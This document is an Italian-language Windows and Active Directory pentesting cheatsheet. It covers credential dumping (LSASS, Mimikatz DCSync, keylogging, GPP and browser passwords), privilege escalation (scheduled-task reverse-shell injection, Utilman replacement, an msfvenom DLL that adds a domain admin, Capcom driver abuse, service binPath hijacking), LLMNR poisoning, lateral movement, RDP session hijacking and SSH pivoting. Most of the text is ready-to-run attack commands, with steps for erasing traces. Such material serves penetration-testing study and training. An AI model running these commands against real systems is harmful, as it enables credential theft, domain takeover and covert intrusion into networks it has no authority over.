     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa #path della key da cercare
<!---->
     RunAsPPL = 1 #value della key che va modificata in 1 per disattivare LSA
<!---->
_Se il tutto funziona avendo disattivato la protezione LSA, possiamo recuperare dal dump del LSASS diverse informazioni grazie al tool python __"pypykatz"___
<!---->
     pip3 install pypykatz #comando per installare pypykatz
<!---->
     pypykatz lsa minidump lsass.DMP #comando per recupeare le informazioni dal dump
<!---->
 _Altrimenti se si dispone di [Mimikatz](./#mimikatz), il processo puà essere velocizzato grazie al tool_

- __DCSync attack:__

_Consiste nel simulare il comportamento di un domain controller e poter recuperare le password di altri utenti tramite replicazione di dominio._

_Comandi:_
<!---->
     mimikatz lsadump::dcsync /domain:<nome dominio> /user:<nome utente> #comando che fa il DCSync di un solo utente
<!---->
     mimikatz lsadump::dcsync /domain:<nome dominio> /all #comando che fa il DCSync di tutto il DB
<!---->
     log <nome>.txt #comando per salvare il contenuto di un comando in file di log
<!---->
_viene spiegato il tipo di attacco con alcuni comandi di Mimikatz ma se vi vuole avere la lista completa la si trova [qui](./#mimikatz)_

- __Metasploit Keylogger:__

_La msfconsole dispone di un keylogger integrato che puà ritornare molto utile per il recupero di eventuali password_

_Comandi:_
<!---->
      keyscan_start #comando per avviare il keylogger
<!---->
      keyscan_dump #comando per dumpare quello che ha registrato il keylogger
<!---->
      keyscan_stop #comando per fermare il keylogger
<!---->
_viene spiegato una feature di metasploit per una maggiore visione andare [qui](./#metasploit)_

- __GPP (Group Policy Preferences):__

_le GPP (Group Policy Preferences) fa parte delle [GPO](./#gruppi) (nella sezione persistence sotto la voce gruppi vi è una spiegazione delle GPO), le GPP permettono una maggiore flessibilità nel gestire le policy e le impostazioni del computer ma inoltre permettono di registrare le credenziali in diversi casi all'interno dell'AD.
Le credenziali sono criptate con AES però la stessa Microsoft ne' ha rilasciato la chiave tra i propri [Docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) e tramite il tool della suite [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) possiamo recuperare le credenziali_

- _Comandi:_
<!---->
      Import-Module .\Get-GPPPassword.ps1 #comando per importare il modulo Get-GPPPassword.ps1
<!---->
      Get-GPPPassword #comando del modulo
<!---->
_Una volta recuperate le credenziali possono essere recuperate tramite la chiave pubblicata da Microsoft_

- __StickyNoteas(Memo):__

_Un normale utente per comodità può copiare e lasciarle nell' app memo per comodità_

- _Comandi:_
<!---->
      gci C:\Users\<nome utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState #comando per visionare la presenza di db sqlite
<!---->
_Sono due le opzioni se vi sono presenti dei db .sqlite, la prima e copiarli in [sqlitebrowser](https://sqlitebrowser.org/dl/) o utilizzare il modulo [PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite)_

1) sqlite browser:

_Il primo metodo è abbastanza semplice, una volta individuati i db, vanno scaricati e aperti con il relativo software_

2) PSSQLite:
<!---->
      Set-ExecutionPolicy Bypass -Scope Process #comando per settare la execution policy della shell corrente in modalità Bypass
<!---->
      Import-Module .\PSSQLite.psd1 #comando per impotare il modulo
<!---->
      $db = 'C:\Users\<nome utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\<nome file>.sqlite' #comando per salvare la path al .sqlite target
<!---->
      Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap #comando per estrarre i dati tramite una query
<!---->

__N.B: possiamo utilizzare pure il comando strings sulla nostra machine però non è molto consigliato se il db è troppo grande__

- __Browser passwords:__

_Ogni browser permette di salvare le password offline ma tramite tool specifi è possibile recuperarle:_

1) [SharpChrome](https://github.com/GhostPack/SharpDPAPI)
<!---->
      .\SharpChrome.exe logins /unprotect #comando del tool sharpchrome per recuperare la password
<!---->
2) [Firefox decrypt](https://github.com/unode/firefox_decrypt)
<!---->
      python3 firefox_decrypt.py <path al file profiles.ini> #comando del tool firefox decrypt per recuperare la password
<!---->
##### Tools:

_Esistono diversi tool che automatizzano il recupero di credenziali quali:_

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)

_Viene allegato pure un [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) con comandi e dove cercare per eventuali credenziali lasciate in giro_

### Varie:

- __Utilizzo di GUI:__

_Quando possibile se si ha accesso ad una windows machine cioè tramite RDP ed quindi possibile utilizzare la GUI e vi possono essere degli eseguibili che runnano in modalità privilegiatà puù essere utile un commando._
<!---->
     tasklist /V | findstr <nome eseguibile> #comando che lista tutti i processi in verbose mode che poi manda a findstr per cercare il processo
<!---->
- __StartUp directory:__

_La startup directory può essere utilizzata per il Privilege escalation, ogni qualvoltà vi è il boot del pc_
<!---->
     C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" #comando per vedere se abbiamo i permessi di writing sulla cartella StartUp
<!---->
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\<word writable folder>\<nome eseguibile da usare>.exe"
     oLink.Save #questo script in vbs permette di creare un collegamento nella directory startup che punterè ad un nostro eseguibile
<!---->
- __Potato attacks:__

_Rogue potato:_

_Con i privilegi SeAssignPrimaryToken o SeImpersonate privilege un utente può runnare codice o creare nuovi processi in account di altri utenti, l'exploit lanciato da local o da un network service permette di diventare SYSTEM_

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) = tool che controlla se l'user ha il SeImpersonate privilege e poi fa il Privilege escalation a SYSTEM

_Comandi:_
<!---->
     PrintSpoofer64.exe -i -c cmd #comando per avviare printspoofer
<!---->
- __Scheduled Tasks:__

_Vettori di Privilege escalation possono essere task creati da utenti ma mal configurati_

_Comandi:_
<!---->
      schtasks /query /tn <nome task> /fo list /v #comando per ottenere info su un task
<!---->
      Task to Run: #parametro che indica cosa runna il task 
<!---->
      Run as User: #parametro che indica che user che lo runna
<!---->
      icacls <Path eseguibile nel parametro Task to run> #andiamo a vedere i permessi che abbiamo sull'eseguibile
<!---->
      echo c:\<path nostro eseguibile> -e cmd.exe <ip> <porta> > <path da sostituire del parametro Task to run> #comando che in questo caso inserisce una revshell
<!---->
      schtasks /run /tn vulntask #comando per avviare il task
<!---->
- __Privilegio SeTakeOwnerShip:__

_Questo privilegio permette di prendere il controllo di ogni oggetto del sistema, incluso file, chiavi di registro o servizi ed è molto probabile che possa essere utilizzato per prendere di mira oggetti che runnano come SYSTEM_

_Comandi:_ 
<!---->
    whoami /priv #comando per vedere i propri privilegi
<!---->
    takeown /f C:<path eseguibile> #comando che permette di prenderne il controllo
<!---->   
    icacls C:\Windows\System32\Utilman.exe /grant <nome account>:F 
    #Avendo il controllo non per forza abbiamo i permessi necessari, ma comunque con il SeTakeOwnerShip possiamo ottenerli con il seguente comando che modifica le ACL
<!---->  
    copy cmd.exe <nome eseguibile> #comando per sostituire l'eseguibile 
<!---->  
_Esiste una repo molto interessante dove, vi sono diverse POC per sfruttare i vari privilegi assegnati come nel caso del SeTakeOwnerShip è possibile trovare tutto [qui](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC), inoltre voglio allegare uno script .ps1 che se nel caso il privilegio fosse disattivato abbiamo buone probabilità di riattivarlo, è possibile trovarlo [qui](https://github.com/fashionproof/EnableAllTokenPrivs)_

- __Unpatched Software:__

_Nella macchina target, possono esserci benissimo software non aggiornati all'ultima versione che possono essere vettori di Privilege escalation_

_Comandi:_
<!---->  
    wmic product get name,version,vendor #comando per listare software e info, non funziona sempre per tutti i programmi
<!---->  
- __Named pipes:__

_Le named pipes mettono in comunicazione processi o applicazioni tra di loro, sono una sorta di file che vivono in memoria e che vengono eliminate una volta lette._

_Comandi:_
<!---->  
    gci \\.\pipe\ #comando powershell per listare le named pipes
<!---->  
    accesschk.exe /accepteula -w \\.\Pipe\<named pipe> -v #comando per vedere i permessi dati ad una named pipe
<!----> 
_Un esempio di exploit è la named pipe __"pipe\WindscribeService"__, che permette di eseguire programmi con privilegi di amministratore, è possibile sfruttarlo a nostro vantaggio tramite il modulo di metasploit chiamato __"exploit/windows/local/windscribe_windscribeservice_priv_esc"___

- __Privilegio SeDebugPrivilege:__

_Il privilegio SeDebugPrivilege permette ad un utente di avere enormi poteri, in quanto permette di: prendere informazioni sensibili dalla memoria di sistema, accedere o modificare kernel e applicazioni e ecc..._

_Comandi:_

_Un possibile sfruttamento di questo privilegio è tramite lo script .ps1 chiamato [psgetsys](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1), lo script permetterà di creare un processo figlio, il quale erediterà il token dei permessi da un processo padre che runna come SYSTEM_
<!----> 
      import-module .\psgetsys.ps1 #comando per importare il .ps1
<!----> 
      Get-Process <processo privilegiato> #comando per prendere il pd del processo privilegiato
<!----> 
      [MyProcess]::CreateProcessFromParent("<pid processo>","<comando da eseguire>", "") #comando per eseguire l'exploit
<!----> 
_Esiste una repo molto interessante dove, vi sono diverse POC per sfruttare i vari privilegi assegnati come nel caso del SeDebugPrivilege è possibile trovare tutto [qui](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC), inoltre voglio allegare uno script .ps1 che se nel caso il privilegio fosse disattivato abbiamo buone probabilità di riattivarlo, è possibile trovarlo [qui](https://github.com/fashionproof/EnableAllTokenPrivs)_

- __Gruppi built-in:__

_I windows gruppi built-in sono gruppi di sicurezza che vengono creati quando viene installato windows stesso, questi gruppi conferiscono privilegi speciali ai membri del loro gruppo e quindi possono essere vettore per Privilege escalation_

1) _Backup Operators:_

_Il Backup Operators dispone di 2 privilegi molto importanti SeBackup e SeRestore, in parole povere permettono leggere e scrivere ogni file del sistema ignorando le ACE, gli stessi privilegi sono utilizzati in una tecnica di persistenza proprio [qui](https://github.com/AleHelp/Windows-Pentesting-cheatsheet/blob/main/#privilegi)_

_Comandi:_

_Impostazioni di default settano il privilegio __"SeBackup"__, in modalità disattivato ma tramite questo [script](https://github.com/giuliano108/SeBackupPrivilege) potremmo riattivarlo ed oltre a questo ci fornirà alcuni comandi utili_
<!----> 
      whoami /priv #comando per vedere i nostri prvilegi, SeBackup risulterà disattivato
<!----> 
      Import-Module .\SeBackupPrivilegeUtils.dll
      Import-Module .\SeBackupPrivilegeCmdLets.dll #comandi che importano i moduli delle utils e cmdlets dello script
<!----> 
      Set-SeBackupPrivilege #comando dello script che riattiva il privilegio
<!----> 
      Copy-FileSeBackupPrivilege '<path file da copiare>' <path file da salvare> #comando dello script che tramite il privilegio ci permette di copiare ogni file
<!---->
2) _Event Log Readers:_

_Gruppo che ha i permessi per vedere, modificare i log di sistema_

_Comandi:_
<!---->
     net localgroup "Event Log Readers" #comando per vedere i membri del gruppo
<!---->
     wevtutil qe <tipologia evento> /rd:true /f:text | Select-String "<stringa da cercare>" #comando che fa una query dei log più recenti che poi vengono formattati in testo per poi 
     cercare parole chiavi
<!---->
3) _DnsAdmins:_

_Il gruppo DnsAdmins permette di visionare le informazioni del DNS come gruppo e forse uno dei più utili per il privilege escalation in quanto il servizio DNS è runnato da SYSTEM quindi l'user più forte nel sistema_

__N.B: il seguente tipo di privilege escalation è possibile quando il DNS è stato avviato nel domain controller, se facciamo parte del gruppo DnsAdmins e se abbiamo i privilegi di stoppare e avviare i servizi__

_Comandi:_
<!---->
     msfvenom -p windows/x64/exec cmd='net group "domain admins" <nome utente> /add /domain' -f dll -o <nome dll>.dll #comando di msfvenom che genera un dll malevola con al suo interno un 
     comando CMD per aggiungere un utente al gruppo domain admins e che verrà utilizzata per essere injectata nella configurazione del dns target
<!---->
_La dll malevola va spostata nella macchina target_
<!---->
     dnscmd.exe /config /serverlevelplugindll <full path dll malevola>.dll #comando che tramite l'eseguibile dnscmd cambie le impostazioni dns andando ad inserire la dll malevola come 
     plugin server
<!---->
__N.B: il comando di sopra può essere lanciato solo da membri del gruppo DnsAdmins__

_Ora dobbiamo stoppare e riavviare il servizio dns ma per farlo prima bisogna controllare se abbiamo i permessi per farlo_
<!---->
     wmic useraccount where name="<nome utente>" get sid #comand CMD che recuper il nostro SID, questo servirà per vedere se il SID ha i permessi necessari per il servizio
<!---->
     sc.exe sdshow dns #comando che mostra il security descriptor(SID) del servizio DNS, nell'output dovrà comparire il sid del nostro utente con i dovuti permessi
<!---->
     sc stop dns
     sc start dns #comandi per fermare e poi riavviare il servizio dns
<!---->
_Ora fare il logoff per applicare le modifice e poi rientrare_
<!---->
     net localgroup "domain admins" #comando che lista i membri del gruppo, di cui il nostro utente farà parte
<!---->
_Infine se vogliamo ripulire il tutto dopo aver fatto_
<!---->
     reg delete \HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll #comando per eliminare le tracce della modifica
<!---->
     sc stop dns
     sc start dns #comandi che stoppano e avviano il servizio dns per applicare le nuove modifiche
<!---->
 - _WPAD record:_

_WPAD record (Web Proxy Auto-Discovery), è un record all'interno dell'AD che permette ai dispostivi di trovare automaticamente il server proxy; bene il gruppo __"DnsAdmins"__ permette di configurare la __"lista globale di blocco delle query del server DNS"__, una lista dove troviamo bloccati anche i WPAD record; l'attacco consiste nel disattivare la lista globale e poi aggiungere una WPAD record che punti al nostro pc dove avremmo avviato responder in ascolto delle macchine vittime che hanno l'impostazione WPAD attiva_

_Comandi:_
<!---->
      Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <nome server dns> #comando per disattivare le global query su una determinata macchina
<!---->
      Add-DnsServerResourceRecordA -Name wpad -ZoneName <nome zona> -ComputerName <nome server dns> -IPv4Address <ip macchina> #comando per aggiungere il WPAD record
<!---->
4) _Hyper-V Administrators:_

_E' il gruppo che ha il controllo totale sulle funzioni dell'Hyper-V, questo gruppo tramite questo [script](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) ci permetterà di diventare SYSTEM_

5) _Print Operators:_

_Il gruppo print operators tramite il privilegio __"SeLoadDriverPrivilege"__, permette i diritti di accedere, modificare e eliminare tutte i printers collegate ad un Domain Controller_

_Comandi:_
<!---->
      whoami /priv #comando per listare i nostri permessi
<!---->
_Potremmo notare che il privilegio SeLoadDriverPrivilege sarà disattivato, il primo passo è di utilizzare seguente [script](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)_
<!---->
      #include <windows.h>
      #include <assert.h>
      #include <winternl.h>
      #include <sddl.h>
      #include <stdio.h>
      #include "tchar.h" #include che vanno aggiunti al codice dello script
<!---->
      cl /DUNICODE /D_UNICODE <nome file script>.cpp #comando per compilare lo script, in questo caso viene utilizzato cl.exe di Visual Studio
<!---->
_Il secondo passo è di abusare del driver [__"Capcom.sys"__](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), il seguente driver permette ad ogni utente di eseguire [shellcode](./#shellcode) con privilegi di SYSTEM_

__N.B: il driver se non presente va scaricato e passato alla target machine__
<!---->
      reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\<path del driver>" #comando che aggiunge una subkey ImagePath al driver vulnerabile
<!---->
      #la notazione \??\ è una notazione interna che dice di interpretarla in questa maniera C:\<path driver>
<!---->
      reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 #comando che aggiunge una subkey di nome type e la setta a 1
<!---->
_Terzo passo, utilizzare lo script caricato in precedenza, attivare il privilegio e controllare se il driver è stato caricato, per visionare il driver utiliziamo il seguente [tool](https://www.nirsoft.net/utils/driverview-x64.zip)_
<!---->
      .\<nome script>.exe #comando che avvia l'eseguibile per attivare il privilegio SeLoadDriverPrivilege
<!---->
      .\DriverView.exe #comando che avvia il tool per vedere i driver
<!---->
      .\DriverView.exe /stext <nome file>.txt
      cat <nome file>.txt | Select-String -pattern Capcom #comandi powershell che possono semplificare la ricerca
<!---->

_Infine con il seguente [script](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom) che va compilato potremmo ottenere una shell con privilegi SYSTEM_
<!---->
      .\ExploitCapcom.exe #comando per avviare l'eseguibile
<!----> 
      reg delete HKCU\System\CurrentControlSet\Capcom #comando per ripulire le chiavi di registro
<!----> 
__N.B: Capita che non si disponga di GUI per utilizzare ExploitCapcom, in questo caso alla linea 292 "TCHAR CommandLine[] = "<comando_da_cambiare>");" del codice invece di creare una shell in locale possiamo fargli aprire un'eseguibile con all'interno una revshell che punti alla nostra macchina__

_Esiste come al solito un tool che automatizza i passi svolti sopra è chiamato [EopLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)_     

6) _Server Operators:_

_Il gruppo Server Operators permette di amministrare un windows server senza la necessità dei privilegi di domain admin, in questo gruppo ritroviamo i 2 privilegi __"SeBackup"__ e __"SeRestore"__.

_Comandi:_
<!----> 
      sc qc <nome servizio> #comando che fa una query ad un servizio
<!----> 
_converebbe a noi di cercare un servizio che sia avviato dall'account __"SYSTEM"__ e possiamo vedere i permessi con un'utility chiamata [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) della [suite sysinternal-processi](./#processi)_
<!----> 
      .\PsService.exe security <nome servizio> #comando per ottenere informazioni sul servizio, rispetto a sc ci fornisce maggiore output
<!----> 
__N.B: le stesse informazioni possono essere ottenute dal comando "sc", l'utility "PsService" può risultare più veloce nel pratico__
 
_Una volta trovato il servizio dove il nostro gruppo ha come privilegi __"all"__, cambiamo il __"binary path name"___
<!----> 
      sc config <nome servizio> binPath= "cmd /c net localgroup Administrators <nome utente> /add" #comando che cambia il binary path name di un servizio con un comando CMD che aggiunge un 
      nostro utente al gruppo degli Administrators
<!----> 
_Ora da qui in poi possiamo accedere al domain controller come parte del gruppo amministratore_

- __Responder e mitm6:__

_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
<!---->
    sudo responder -I <interfaccia di rete>
<!---->
_attacchi MITM._
<!---->
     sudo python3 mitm6.py -i <interfaccia di rete> -d <nome dominio target> #tool utilizzato per il man in the middle su ipv6
<!---->

### Tools:

 - [Winpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20230910-ae32193f) = tool molto potente per cercare possibili privesc

 - [PrivescCheck](https://github.com/itm4n/PrivescCheck) = alternativa a Winpeas se non si vuole eseguire un file binario

 - [Wesng](https://github.com/bitsadmin/wesng) = python script meno rumoroso rispetto a winpeas

 _N.B prima di startare wesng utilizzare il comando __"wes.py --update"__ per aggiornare il db, poi runnare il comando __"systeminfo"__ ed infine per avviare lo script utilizzare il seguente comando __"wes.py systeminfo.txt"___

 - [SharpUp](https://github.com/GhostPack/SharpUp)

### Lateral movements:

##### Lanciare comandi da remoto:

- __Psexec64:__

_Caricando sulla macchina che abbiamo o se gia presente il tool psexec64.exe (integrato nella suite sysinternal di windows), permette di poter lanciare comandi da remoto, richiede di far parte degli Administrator group o avere dei poteri d'amministratore_

_Comandi:_
<!---->
       psexec64.exe \\<ip macchina> -u <user> -p <password> -i <commando> #comando per lanciare da remoto, i doppi backslash sono per quando utilizzamo SMB 
       sennò basta mettere un ip normale
<!---->
- __WinRM:__

_WinRm permette di poter utilizzare una shell o lanciare comandi powershell sempre da remoto, il gruppo richiesto è quello dei Remote Managemnet Users:_ 

_Comandi:_
<!---->
        $username = '<user>';
        $password = '<passowrd>';
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
        $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!---->       
        Enter-PSSession -Computername <ip> -Credential $credential #comando per entrate nella sessione
<!---->       
        Invoke-Command -Computername <ip> -Credential $credential -ScriptBlock {whoami} #comando per lanciare altri comandi da remoto
<!---->
- __SC.exe:__

_sc.exe permette di creare processi da remoto e lo fa tramite DCE/RPC:_

_Funzionamento:_

 1) connessione alla porta 135 che è quella del EPM(Endpoint Mapper) un servizio del protocollo DCE/RPC che indica indirizzo e la porta per un servizio, EPM.

 2) EPM indica ip e porta (range da 49152 a 65535) del SVCCTL (Service Control Manager Interface) APi per comunicare con il service control manager

 2.2) se la connessione tramite RPC fallisce il client prova tramite SMB named pipes o SMB con Netbios.

 _Comandi:_
<!-- -->
       sc.exe \\<ip> create <nome servizio> binPath= "<path binario>" #comando per creare il servizio
<!-- -->       
       sc.exe \\<ip> start <nome servizio> #comando per startarlo
<!-- -->       
       sc.exe \\<ip> stop <nome servizio> #comando per stopparlo
<!-- -->       
       sc.exe \\<ip> delete <nome servizio> #comando per eliminarlo
<!-- -->
- __Task scheduler:__

_Tramite schtasks possiamo creare dei tasks da remoto che in un determinato tempo si ripetono, gruppo richiesto Administrators group o avere dei privilegi_

_Comandi:_
<!-- -->
       schtasks /s <ip> /RU "SYSTEM" /create /tn "<nome task>" /tr "<comando>" /sc ONCE /sd 01/01/1970 /st 00:00 #comando per creare un taks con diversi paramtri
<!-- -->     
       schtasks /s <ip> /run /TN "<nome task>"  #comando per avviarlo
<!-- -->       
       schtasks /S <ip> /TN "<nome task>" /DELETE /F #comando per eliminarlo
<!-- -->
- __WMI:__

_WMI(Windows Management Instrumentation) è utilizzato per la gestione delle risorse locali e di rete, possiamo persino creare processi,servizi e schedule tasks e fa tutto questo da remoto tramite 2 protocolli DCOM (RPC over IP) o Wsman (WinRM); gruppo richiesto Administrators group._

_Porte 135, 49152-65535 (DCERPC) DCOM è un'estensione del DCERPC_

_5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)_

_Comandi per creare una sessione:_
<!-- -->
       $username = '<user>';
       $password = '<passowrd>';
       $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
       $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!-- -->
       $Opt = New-CimSessionOption -Protocol DCOM #comando che crea un'oggetto CIM in cui è specificato il protocollo DCOM 
       $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop #comando che crea la sessione CMI
       #CMI è strettamente correlato con WMI
<!-- -->

_Comandi per creare un processo da remoto:_
<!-- -->
       $Command = "<comando da inserire>"; #variabile contente il processo
ES: `powershell.exe -Command Set-Content -Path C:\Windows\hello.txt -Value hello`
<!-- -->
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
       CommandLine = $Command } #comando per creare il processo
<!-- -->   
       wmic.exe /user:<nome utente> /password:<password> /node:<ip> process call create <comando>" #stesso comando ma per CMD
<!-- -->   

_Comandi per creare un servizio da remoto:_
<!-- --> 
       Invoke-CimMethod -CimSession <sessione> -ClassName Win32_Service -MethodName Create -Arguments @{
       Name = "<nome servizio";
       DisplayName = "<nome>";
       PathName = "<comando>";
       ServiceType = [byte]::Parse("16"); # Win32OwnProces
       StartMode = "Manual"
       } #comando con relativi dettagli per creare un servizio
<!-- --> 
       $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'" #variabile che contiene informzioni per creare 
       l'handle del servizio
<!-- --> 
       Invoke-CimMethod -InputObject $Service -MethodName StartService/StopService/Delete #comando che preso l'handle, avvia/ferma/elimina il servizio
<!-- --> 
_Comandi per creare un task da remoto:_
<!-- --> 
       $Command = "<comando o eseguibile>" 
       $Args = "<argomenti del comando>" #commando e argomenti vanno divisi e inseriti in variabili d'ambiente
<!-- -->        
       $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args #comando per la creazione dell'azione nello schedule
<!-- -->        
       Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<nome task>" #commando per la registrazione del task
<!-- -->        
       Start-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando che avvia il task
<!-- -->       
       Unregister-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando per eliminarlo
<!-- --> 
_Comandi per installare un nostro MSI installer:_ 
<!-- --> 
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<path installer>"; Options = ""; 
       AllUsers = $false}
       #comando per installare un nostro MSI
<!-- --> 
       wmic /node:<ip> /user:<eventuale dominio>\<utente> product call install PackageLocation=<Path installer> #stesso comando ma per CMD
<!-- --> 
- __RDP hijacking:__

_RDP hijacking funziona se vi è una connessione RDP dove è chiusa ma non è stato fatto il logout e quindi solo con il reboot del server si potrà chiudere definitivamente, funziona sulle versioni di windows server 2016, nella 2019 richiede la password._

_Commandi:_
<!-- -->
      #runnato con privilegi di SYSTEM
      query user #query delle sessioni attive, se nell'output notiamo una sessione in state DISC significa che è vulnerabile
<!-- -->     
OUPUT di esempio:
<!-- -->
      USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
      administrator         rdp-tcp#6           3  Active          .  6/3/2023 5:09 AM
      serverAdmin                               4  Disc            .  6/7/2023 7:51 AM
<!-- -->
      tscon 4 /dest:rdp-tcp#6 #comando per dire di legare la sessione di ID 4 alla nostra che è la 3
<!-- -->
##### __Port Forwarding:__

_Tramite tecniche di port forwarding in diverse maniere è possibile fare pivoting, tra diverse macchine_

__N.B: si suppone che si abbia compromesso almeno una macchina per poter applicare le seguenti metodologie.__

- __SSH Tunneling:__

1) _Remote port Forwarding:_
 
__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__
  
_Comandi:_
<!-- -->
      useradd <nome user> -m -d <path directory user> -s <shell da utilizzare> #comando per creare un'utente sulla machina compromessa che verrà utilizzato per la 
      connessione SSH con le altre macchine target
<!-- -->      
      passwd <password> #comando per impostare password
<!-- -->
      ssh <nome utente>@<ip> -R <porta aperta della propria machine>:<ip remoto>:<porta target> -N  #comando che si connette alla macchina compromessa e che poi 
      binda una porta remota con la propria porta, -N per creare solo la connessione
<!-- -->
ES: 

`ssh user@3.2.1.9 -R 3389:3.2.2.2:3389 -N /3389 porta RDP/`

`xfreerdp /v:127.0.0.1 /u:user /p:passwd123`

2) _Local port Forwarding:_

__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__

_Comandi:_
<!-- -->
       ssh <nome utente>@<ip> -L *:<porta della propria macchina>:<ip target>:<porta target> -N #comando che si connetta alla macchina compromessa, mettiamo
       in ascolto tutte le interfacce di rete disponibili e che poi binda la nostra porta con quella target remota
<!-- -->
	ssh <nome utente>@<ip> -L  <porta locale>:<ip remoto>:<porta remota> <porta locale>:<ip remoto>:<porta remota> #comndo per fare il local forward di più porte
<!-- -->
       netsh advfirewall firewall add rule name="<nome regola>" dir=<specifica direzione> action=<azione> protocol=<protocollo> localport=<porta> #comando per 
       modificare le regole del firewall della nostra kali machine, a seconda del tunneling creato
<!-- -->
ES:

`ssh user@3.2.1.9 -L *:80:127.0.0.1:80 -N`

_Ci andremo a connettere prima alla nostra kali machine da li accediamo alla macchina compromessa con __"user@3.2.1.9"__ subito dopo indichiamo di creare un socket __"*.80"__ che ascolta su tutte le interfaccie di rete disponibili alla porta 80, per poi bindarla con __"127.0.0.1:80"__ la porta 80 della macchina vittima su cui è stato lanciato il comando SSH con il proprio indirizzo quindi quello di loopback._

`netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`

_Verrà creato una regola che permette connessioni in ingresso alla porta 80._

3) _Dynamic Forwarding con proxychains:_

_Dynamic forwarding locale è utilizzato come tecnica di pivoting per le reti, tutti i comandi vengono prima inviati al __"Socks"__ locale e poi alla macchina target_

_Comandi:_
<!-- -->
_Il primo comando si connette alla machine target e nel mentre inizializza il proxysocks all'indirizzo __"127.0.0.1:9050"___
<!-- -->
      ssh -D 9050 <user>@<ip> #comando per abilitare il dynamic forwarding 
<!-- -->
      tail -4 /etc/proxychains.conf #comando per vedere se proxysocks è stato settato
<!-- -->
_I seguenti comandi avviano nmap che a seconda dei parametri o comandi assegnati passando per __"proxychains"__ li esegue_
<!-- -->
      proxychains nmap -v -sn <ip> #comando che runna nmap e poi tramite proxychains redirecta i comandi dalla porta 9950 al ssh
<!-- -->
      proxychains nmap -v -Pn -sT <ip> #comando per runnare nmap verso una macchina windows sempre utilizzando le proxychains
<!-- -->
      proxychains nmap -iflist #comando per runnare nmap e lista le interfaccie di rete disponibili
<!-- -->
_Allego anche dei comandi in bash,cmd e powershell che enuemerano gli host di una determinata subnet se il ping è permesso all'interno della rete:_
<!-- -->
      for i in {1..254} ;do (ping -c 1 <ip subnet>.$i | grep "bytes from" &) ;done #comando bash che data una subnet enumera tramite ping
<!-- -->
      for /L %i in (1 1 254) do ping <ip subnet>.%i -n 1 -w 100 | find "Reply" #comando cmd che data una subnet enumera tramite ping
<!-- -->
      1..254 | % {"<ip subnet>.$($_): $(Test-Connection -count 1 -comp <ip subnet>.$($_) -quiet)"} #comando powershell che data una subnet enumera tramite ping
<!-- -->
__N.B: prestare attenzione ai bit dedicati all'host in questo caso abbiamo ipotizzato che fossero 8 quindi da 1 a 254__

ES:

`ssh -D 9050 ubuntu@10.129.200.60`

`proxychains nmap -v -sn 176.14.5.1-200`

Nell'esempio sopra i pacchetti nmap seguono questo percorso:

nmap----> 127.0.0.1:9050----> SSH:22----> scanning delle reti 176.14.5.1-200

